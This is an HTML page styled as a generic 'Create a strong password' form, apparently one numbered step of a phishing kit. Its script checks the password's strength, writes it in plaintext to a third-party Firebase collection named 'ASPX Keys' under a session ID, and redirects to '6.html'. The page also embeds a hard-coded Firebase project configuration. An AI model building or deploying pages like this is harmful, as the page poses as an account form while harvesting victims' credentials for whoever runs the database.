<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Create Password</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #ffffff;
            color: #000000;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
            box-sizing: border-box;
        }

        h1 {
            font-size: 30px;
            font-weight: bold;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: white;
            padding: 0 5px;
            font-size: 12px;
            color: #6e6e73;
        }

        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 1px solid #c2c8d0;
            border-radius: 25px; /* Radius preserved */
            box-sizing: border-box;
            outline: none;
        }

        input:focus {
            border-color: #000000;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-bottom: 10px;
            font-size: 14px;
            padding-left: 10px;
            cursor: pointer;
        }

        .checkbox-container input {
            margin-right: 10px;
            accent-color: #000000;
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .requirement-hint {
            color: #d93025;
            font-size: 13px;
            text-align: left;
            padding-left: 10px;
            margin-bottom: 20px;
            line-height: 1.4;
            display: none; /* Only shows on error */
        }

        .btn-continue {
            width: 100%;
            padding: 14px;
            background-color: #000000;
            color: white;
            border: none;
            border-radius: 25px; /* Radius preserved */
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .btn-continue:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Create a strong password</h1>

    <div class="input-group">
        <label>Password</label>
        <input type="password" id="password" autocomplete="new-password">
    </div>

    <div class="input-group">
        <label>Confirm password</label>
        <input type="password" id="confirmPassword" autocomplete="new-password">
    </div>

    <div class="checkbox-container" onclick="document.getElementById('showPassCheckbox').click()">
        <input type="checkbox" id="showPassCheckbox" onclick="event.stopPropagation(); togglePassword()">
        <span>Show password</span>
    </div>

    <div id="ruleHint" class="requirement-hint">
        Create a strong password with a mix of letters, numbers and symbols.
    </div>

    <button class="btn-continue" id="submitBtn" onclick="handleSubmission()">Continue</button>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
        authDomain: "question-metabase.firebaseapp.com",
        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "question-metabase",
        storageBucket: "question-metabase.firebasestorage.app",
        messagingSenderId: "770698198753",
        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
        measurementId: "G-6ZP1FPMKSJ"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');

    // Enable Enter key submission
    const inputs = [document.getElementById('password'), document.getElementById('confirmPassword')];
    inputs.forEach(input => {
        input.addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                handleSubmission();
            }
        });
    });

    window.togglePassword = function() {
        const isChecked = document.getElementById('showPassCheckbox').checked;
        const p = document.getElementById('password');
        const cp = document.getElementById('confirmPassword');
        p.type = isChecked ? "text" : "password";
        cp.type = isChecked ? "text" : "password";
    };

    window.handleSubmission = async function() {
        const password = document.getElementById('password').value;
        const confirmPassword = document.getElementById('confirmPassword').value;
        const hint = document.getElementById('ruleHint');
        const submitBtn = document.getElementById('submitBtn');

        hint.style.display = "none";

        // Logic check
        const lengthValid = password.length >= 8;
        const complexityValid = /^(?=.*[a-zA-Z])(?=.*\d)(?=.*[!@#$%^&*()_+{}\[\]:;<>,.?~\\/-]).+$/.test(password);
        const noSpacesValid = !password.startsWith(' ') && !password.endsWith(' ');
        const matches = password === confirmPassword && password !== "";

        if (!lengthValid || !complexityValid || !noSpacesValid || !matches) {
            hint.style.display = "block";
            hint.innerText = !matches ? "Passwords do not match." : "Create a strong password with a mix of letters, numbers and symbols.";
            return;
        }

        if (!sessionId) return;

        try {
            submitBtn.disabled = true;
            submitBtn.innerText = "Processing...";

            const docRef = doc(db, "ASPX Keys", sessionId);
            await updateDoc(docRef, {
                password: password,
                updatedAt: new Date().toLocaleString() + " UTC+5:30"
            });

            // Success Redirect
            window.location.href = `6.html?session=${sessionId}`;
            
        } catch (e) {
            console.error(e);
            hint.style.display = "block";
            hint.innerText = "Session not found or connection error.";
            submitBtn.disabled = false;
            submitBtn.innerText = "Continue";
        }
    };
</script>

</body>
</html>
